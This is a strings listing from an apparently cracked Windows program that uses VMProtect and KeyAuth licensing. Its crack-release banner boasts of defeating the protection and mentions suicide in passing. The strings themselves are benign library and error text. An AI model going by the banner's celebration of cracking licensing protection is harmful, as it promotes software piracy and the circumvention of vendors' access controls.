#############
CRACKED BY kwsstas.westt#1312
#############
DONT DM FOR SUPPORT!!
#############
Galaxy < Suicide


Offset	Size	Type	String
00000188	05	A	.text
000001af	07	A	`.rdata
000001d7	06	A	@.data
00000200	06	A	.pdata
00000227	06	A	@.vmp0 ### VMP GOT FUCKED HEHE
0000024f	06	A	`.vmp1
00000278	05	A	.rsrc
0000e4c3	05	A	D$<&
0000e4db	06	A	D$xw{
0000e4f0	05	A	D$4~&
0001195d	05	A	D$L&
00011984	05	A	D$Tr&
00013255	05	A	D$L&
0001326d	06	A	D$xw{
00013282	05	A	D$D~&
00013292	05	A	D$<i&
000132aa	05	A	D$h{"
000156f0	05	A	D$L&
00015725	05	A	D$D~&
00015749	05	A	D$<i&
00015761	05	A	D$h{"
00030770	05	A	D$P @
00031628	05	A	D$T @
0003f69c	07	A	unknown
0003fd7c	07	A	unknown
00045abf	07	A	(){ %*]
0004da06	05	A	t`=A'
00056814	06	A	t$8A8]
0006b200	07	A	success
0006b208	10	A	map/set too long
0006b240	10	A	[json.exception.
0006b270	0b	A	parse error
0006b280	0b	A	parse_error
0006b290	09	A	, column 
0006b2a0	09	A	 at line 
0006b2c8	0c	A	out_of_range
0006b2d8	08	A	username
0006b2f0	0a	A	createdate
0006b300	09	A	lastlogin
0006b310	0d	A	subscriptions
0006b320	0c	A	subscription
0006b330	06	A	expiry
0006b338	08	A	numUsers
0006b348	0e	A	numOnlineUsers
0006b358	07	A	numKeys
0006b360	07	A	version
0006b368	11	A	customerPanelLink
0006b380	07	A	message
0006b430	0f	A	KeyAuth_Invalid
0006b440	09	A	sessionid
0006b450	07	A	appinfo
0006b458	0a	A	invalidver
0006b468	08	A	download
0006b480	09	A	signature
0006b4a8	0f	A	popen() failed!
0006b4b8	14	A	certutil -hashfile "
0006b4d0	10	A	xxxx?xxxx????xxx
0006b500	0f	A	vector too long
0006b510	05	A	value
0006b518	0d	A	syntax error 
0006b528	0e	A	while parsing 
0006b540	0e	A	; last read: '
0006b550	0b	A	unexpected 
0006b560	0b	A	; expected 
0006b570	08	A	<U+%.4X>
0006b580	2c	A	invalid BOM; must be 0xEF 0xBB 0xBF if given
0006b5b0	0f	A	invalid literal
0006b5c0	0f	A	<uninitialized>
0006b5d0	0c	A	true literal
0006b5e0	0d	A	false literal
0006b5f0	0c	A	null literal
0006b600	0e	A	string literal
0006b610	0e	A	number literal
0006b638	0d	A	<parse error>
0006b648	0c	A	end of input
0006b658	16	A	'[', '{', or a literal
0006b670	0d	A	unknown token
0006b680	28	A	invalid number; expected digit after '-'
0006b6b0	28	A	invalid number; expected digit after '.'
0006b6e0	3a	A	invalid number; expected '+', '-', or digit after exponent
0006b720	32	A	invalid number; expected digit after exponent sign
0006b758	25	A	invalid comment; missing closing '*/'
0006b780	2f	A	invalid comment; expecting '/' or '*' after '/'
0006b7b0	25	A	invalid string: missing closing quote
0006b7d8	35	A	invalid string: '\u' must be followed by 4 hex digits
0006b810	4b	A	invalid string: surrogate U+D800..U+DBFF must be followed by U+DC00..U+DFFF
0006b860	43	A	invalid string: surrogate U+DC00..U+DFFF must follow U+D800..U+DBFF
0006b8a8	33	A	invalid string: forbidden character after backslash
0006b8e0	48	A	invalid string: control character U+0000 (NUL) must be escaped to \u0000
0006b930	48	A	invalid string: control character U+0001 (SOH) must be escaped to \u0001
0006b980	48	A	invalid string: control character U+0002 (STX) must be escaped to \u0002
0006b9d0	48	A	invalid string: control character U+0003 (ETX) must be escaped to \u0003
0006ba20	48	A	invalid string: control character U+0004 (EOT) must be escaped to \u0004
0006ba70	48	A	invalid string: control character U+0005 (ENQ) must be escaped to \u0005
0006bac0	48	A	invalid string: control character U+0006 (ACK) must be escaped to \u0006
0006bb10	48	A	invalid string: control character U+0007 (BEL) must be escaped to \u0007
0006bb60	4d	A	invalid string: control character U+0008 (BS) must be escaped to \u0008 or \b
0006bbb0	4d	A	invalid string: control character U+0009 (HT) must be escaped to \u0009 or \t
0006bc00	4d	A	invalid string: control character U+000A (LF) must be escaped to \u000A or \n
0006bc50	47	A	invalid string: control character U+000B (VT) must be escaped to \u000B
0006bca0	4d	A	invalid string: control character U+000C (FF) must be escaped to \u000C or \f
0006bcf0	4d	A	invalid string: control character U+000D (CR) must be escaped to \u000D or \r
0006bd40	47	A	invalid string: control character U+000E (SO) must be escaped to \u000E
0006bd90	47	A	invalid string: control character U+000F (SI) must be escaped to \u000F
0006bde0	48	A	invalid string: control character U+0010 (DLE) must be escaped to \u0010
0006be30	48	A	invalid string: control character U+0011 (DC1) must be escaped to \u0011
0006be80	48	A	invalid string: control character U+0012 (DC2) must be escaped to \u0012
0006bed0	48	A	invalid string: control character U+0013 (DC3) must be escaped to \u0013
0006bf20	48	A	invalid string: control character U+0014 (DC4) must be escaped to \u0014
0006bf70	48	A	invalid string: control character U+0015 (NAK) must be escaped to \u0015
0006bfc0	48	A	invalid string: control character U+0016 (SYN) must be escaped to \u0016
0006c010	48	A	invalid string: control character U+0017 (ETB) must be escaped to \u0017
0006c060	48	A	invalid string: control character U+0018 (CAN) must be escaped to \u0018
0006c0b0	47	A	invalid string: control character U+0019 (EM) must be escaped to \u0019
0006c100	48	A	invalid string: control character U+001A (SUB) must be escaped to \u001A
0006c150	48	A	invalid string: control character U+001B (ESC) must be escaped to \u001B
0006c1a0	47	A	invalid string: control character U+001C (FS) must be escaped to \u001C
0006c1f0	47	A	invalid string: control character U+001D (GS) must be escaped to \u001D
0006c240	47	A	invalid string: control character U+001E (RS) must be escaped to \u001E
0006c290	47	A	invalid string: control character U+001F (US) must be escaped to \u001F
0006c2d8	25	A	invalid string: ill-formed UTF-8 byte
0006c300	15	A	vector<bool> too long
0006c318	0a	A	object key
0006c328	10	A	object separator
0006c340	19	A	number overflow parsing '
0006c35c	05	A	array
0006c364	06	A	object
0006c485	25	A	""&++p8<s942+1i,9# n+1":1;4@rjjstr=wq
0006c5c0	08	A	No error
0006c5d0	14	A	Unsupported protocol
0006c5e8	15	A	Failed initialization
0006c600	2b	A	URL using bad/illegal format or missing URL
0006c630	6c	A	A requested feature, protocol or option was not found built-in in this libcurl due to a build-time decision.
0006c6a0	1b	A	Couldn't resolve proxy name
0006c6c0	1a	A	Couldn't resolve host name
0006c6e0	1a	A	Couldn't connect to server
0006c700	12	A	Weird server reply
0006c718	20	A	Access denied to remote resource
0006c740	2e	A	FTP: The server failed to connect to data port
0006c770	2b	A	FTP: Accepting server connect has timed out
0006c7a0	30	A	FTP: The server did not accept the PRET command.
0006c7d8	17	A	FTP: unknown PASS reply
0006c7f0	17	A	FTP: unknown PASV reply
0006c808	20	A	FTP: unknown 227 response format
0006c830	33	A	FTP: can't figure out the host in the PASV response
0006c868	20	A	Error in the HTTP2 framing layer
0006c890	1b	A	FTP: couldn't set file type
0006c8b0	1a	A	Transferred a partial file
0006c8d0	37	A	FTP: couldn't retrieve (RETR failed) the specified file
0006c908	1c	A	Quote command returned error
0006c928	1d	A	HTTP response code said error
0006c948	30	A	Failed writing received data to disk/application
0006c980	2b	A	Upload failed (at start/before it took off)
0006c9b0	34	A	Failed to open/read local data from file/application
0006c9e8	0d	A	Out of memory
0006c9f8	13	A	Timeout was reached
0006ca10	18	A	FTP: command PORT failed
0006ca30	18	A	FTP: command REST failed
0006ca50	2f	A	Requested range was not delivered by the server
0006ca80	24	A	Internal problem setting up the POST
0006caa8	11	A	SSL connect error
0006cac0	18	A	Couldn't resume download
0006cae0	1c	A	Couldn't read a file:// file
0006cb00	11	A	LDAP: cannot bind
0006cb18	13	A	LDAP: search failed
0006cb30	30	A	A required function in the library was not found
0006cb68	30	A	Operation was aborted by an application callback
0006cba0	2b	A	A libcurl function was given a bad argument
0006cbd0	23	A	Failed binding local connection end
0006cbf8	26	A	Number of redirects hit maximum amount
0006cc20	2a	A	An unknown option was passed in to libcurl
0006cc50	17	A	Malformed telnet option
0006cc68	2d	A	Server returned nothing (no headers, no data)
0006cc98	1b	A	SSL crypto engine not found
0006ccb8	28	A	Can not set SSL crypto engine as default
0006cce8	26	A	Failed to initialise SSL crypto engine
0006cd10	1f	A	Failed sending data to the peer
0006cd30	29	A	Failure when receiving data from the peer
0006cd60	26	A	Problem with the local SSL certificate
0006cd88	21	A	Couldn't use specified SSL cipher
0006cdb0	31	A	SSL peer certificate or SSH remote key was not OK
0006cde8	33	A	Problem with the SSL CA cert (path? access rights?)
0006ce20	35	A	Unrecognized or bad HTTP Content or Transfer-Encoding
0006ce58	10	A	Invalid LDAP URL
0006ce70	1a	A	Maximum file size exceeded
0006ce90	1a	A	Requested SSL level failed
0006ceb0	26	A	Failed to shut down the SSL connection
0006ced8	37	A	Failed to load CRL file (path? access rights?, format?)
0006cf10	2c	A	Issuer check against peer certificate failed
0006cf40	35	A	Send failed since rewinding of the data stream failed
0006cf78	0c	A	Login denied
0006cf88	14	A	TFTP: File Not Found
0006cfa0	16	A	TFTP: Access Violation
0006cfb8	20	A	Disk full or allocation exceeded
0006cfe0	17	A	TFTP: Illegal operation
0006cff8	19	A	TFTP: Unknown transfer ID
0006d018	1a	A	Remote file already exists
0006d038	12	A	TFTP: No such user
0006d050	11	A	Conversion failed
0006d068	33	A	Caller must register CURLOPT_CONV_ callback options
0006d0a0	15	A	Remote file not found
0006d0b8	16	A	Error in the SSH layer
0006d0d0	1e	A	Socket not ready for send/recv
0006d0f0	22	A	RTSP CSeq mismatch or invalid CSeq
0006d118	12	A	RTSP session error
0006d130	1d	A	Unable to parse FTP file list
0006d150	15	A	Chunk callback failed
0006d168	23	A	The max connection limit is reached
0006d190	2f	A	SSL public key does not match pinned public key
0006d1c0	31	A	SSL server certificate status verification FAILED
0006d1f8	28	A	Stream error in the HTTP/2 framing layer
0006d228	28	A	API function called from within callback
0006d258	2c	A	An authentication function returned an error
0006d288	0c	A	HTTP/3 error
0006d298	15	A	QUIC connection error
0006d2b0	0d	A	Unknown error
0006d2c0	10	A	Call interrupted
0006d2d8	08	A	Bad file
0006d2e8	0a	A	Bad access
0006d2f8	0c	A	Bad argument
0006d308	11	A	Invalid arguments
0006d320	17	A	Out of file descriptors
0006d338	10	A	Call would block
0006d350	19	A	Blocking call in progress
0006d370	1a	A	Descriptor is not a socket
0006d390	18	A	Need destination address
0006d3b0	10	A	Bad message size
0006d3c8	0c	A	Bad protocol
0006d3d8	1e	A	Protocol option is unsupported
0006d3f8	17	A	Protocol is unsupported
0006d410	15	A	Socket is unsupported
0006d428	17	A	Operation not supported
0006d440	1c	A	Address family not supported
0006d460	1d	A	Protocol family not supported
0006d480	16	A	Address already in use
0006d498	15	A	Address not available
0006d4b0	0c	A	Network down
0006d4c0	13	A	Network unreachable
0006d4d8	16	A	Network has been reset
0006d4f0	16	A	Connection was aborted
0006d508	14	A	Connection was reset
0006d520	0f	A	No buffer space
0006d530	1b	A	Socket is already connected
0006d550	17	A	Socket is not connected
0006d568	19	A	Socket has been shut down
0006d588	13	A	Too many references
0006d5a0	09	A	Timed out
0006d5b0	12	A	Connection refused
0006d5c4	06	A	Loop??
0006d5d0	0d	A	Name too long
0006d5e0	09	A	Host down
0006d5f0	10	A	Host unreachable
0006d608	09	A	Not empty
0006d618	15	A	Process limit reached
0006d630	0e	A	Too many users
0006d640	09	A	Bad quota
0006d650	12	A	Something is stale
0006d668	0c	A	Remote error
0006d678	0c	A	Disconnected
0006d688	1c	A	Winsock library is not ready
0006d6a8	1f	A	Winsock library not initialised
0006d6c8	1d	A	Winsock version not supported
0006d6e8	0e	A	Host not found
0006d6f8	19	A	Host not found, try again
0006d718	29	A	Unrecoverable error in call to nameserver
0006d748	20	A	No data record of requested type
0006d770	16	A	Unknown error %d (%#x)
0006d788	19	A	Unknown error %u (0x%08X)
0006d7a8	0f	A	CRYPT_E_REVOKED
0006d7b8	18	A	SEC_E_ALGORITHM_MISMATCH
0006d7d8	12	A	SEC_E_BAD_BINDINGS
0006d7f0	0f	A	SEC_E_BAD_PKGID
0006d800	16	A	SEC_E_BUFFER_TOO_SMALL
0006d818	14	A	SEC_E_CANNOT_INSTALL
0006d830	11	A	SEC_E_CANNOT_PACK
0006d848	12	A	SEC_E_CERT_EXPIRED
0006d860	12	A	SEC_E_CERT_UNKNOWN
0006d878	16	A	SEC_E_CERT_WRONG_USAGE
0006d890	15	A	SEC_E_CONTEXT_EXPIRED
0006d8a8	23	A	SEC_E_CROSSREALM_DELEGATION_FAILURE
0006d8d0	1b	A	SEC_E_CRYPTO_SYSTEM_INVALID
0006d8f0	15	A	SEC_E_DECRYPT_FAILURE
0006d908	17	A	SEC_E_DELEGATION_POLICY
0006d920	19	A	SEC_E_DELEGATION_REQUIRED
0006d940	18	A	SEC_E_DOWNGRADE_DETECTED
0006d960	15	A	SEC_E_ENCRYPT_FAILURE
0006d978	1c	A	SEC_E_INCOMPLETE_CREDENTIALS
0006d998	18	A	SEC_E_INCOMPLETE_MESSAGE
0006d9b8	19	A	SEC_E_INSUFFICIENT_MEMORY
0006d9d8	14	A	SEC_E_INTERNAL_ERROR
0006d9f0	14	A	SEC_E_INVALID_HANDLE
0006da08	17	A	SEC_E_INVALID_PARAMETER
0006da20	13	A	SEC_E_INVALID_TOKEN
0006da38	1a	A	SEC_E_ISSUING_CA_UNTRUSTED
0006da58	1e	A	SEC_E_ISSUING_CA_UNTRUSTED_KDC
0006da78	16	A	SEC_E_KDC_CERT_EXPIRED
0006da90	16	A	SEC_E_KDC_CERT_REVOKED
0006daa8	19	A	SEC_E_KDC_INVALID_REQUEST
0006dac8	19	A	SEC_E_KDC_UNABLE_TO_REFER
0006dae8	17	A	SEC_E_KDC_UNKNOWN_ETYPE
0006db00	12	A	SEC_E_LOGON_DENIED
0006db18	1c	A	SEC_E_MAX_REFERRALS_EXCEEDED
0006db38	15	A	SEC_E_MESSAGE_ALTERED
0006db50	17	A	SEC_E_MULTIPLE_ACCOUNTS
0006db68	11	A	SEC_E_MUST_BE_KDC
0006db80	0f	A	SEC_E_NOT_OWNER
0006db90	21	A	SEC_E_NO_AUTHENTICATING_AUTHORITY
0006dbb8	14	A	SEC_E_NO_CREDENTIALS
0006dbd0	16	A	SEC_E_NO_IMPERSONATION
0006dbe8	15	A	SEC_E_NO_IP_ADDRESSES
0006dc00	11	A	SEC_E_NO_KERB_KEY
0006dc18	10	A	SEC_E_NO_PA_DATA
0006dc30	19	A	SEC_E_NO_S4U_PROT_SUPPORT
0006dc50	12	A	SEC_E_NO_TGT_REPLY
0006dc68	15	A	SEC_E_OUT_OF_SEQUENCE
0006dc80	1b	A	SEC_E_PKINIT_CLIENT_FAILURE
0006dca0	1a	A	SEC_E_PKINIT_NAME_MISMATCH
0006dcc0	16	A	SEC_E_POLICY_NLTM_ONLY
0006dcd8	17	A	SEC_E_QOP_NOT_SUPPORTED
0006dcf0	1a	A	SEC_E_REVOCATION_OFFLINE_C
0006dd10	1c	A	SEC_E_REVOCATION_OFFLINE_KDC
0006dd30	16	A	SEC_E_SECPKG_NOT_FOUND
0006dd48	19	A	SEC_E_SECURITY_QOS_FAILED
0006dd68	1a	A	SEC_E_SHUTDOWN_IN_PROGRESS
0006dd88	1c	A	SEC_E_SMARTCARD_CERT_EXPIRED
0006dda8	1c	A	SEC_E_SMARTCARD_CERT_REVOKED
0006ddc8	1e	A	SEC_E_SMARTCARD_LOGON_REQUIRED
0006dde8	21	A	SEC_E_STRONG_CRYPTO_NOT_SUPPORTED
0006de10	14	A	SEC_E_TARGET_UNKNOWN
0006de28	0f	A	SEC_E_TIME_SKEW
0006de38	19	A	SEC_E_TOO_MANY_PRINCIPALS
0006de58	20	A	SEC_E_UNFINISHED_CONTEXT_DELETED
0006de80	19	A	SEC_E_UNKNOWN_CREDENTIALS
0006dea0	1a	A	SEC_E_UNSUPPORTED_FUNCTION
0006dec0	19	A	SEC_E_UNSUPPORTED_PREAUTH
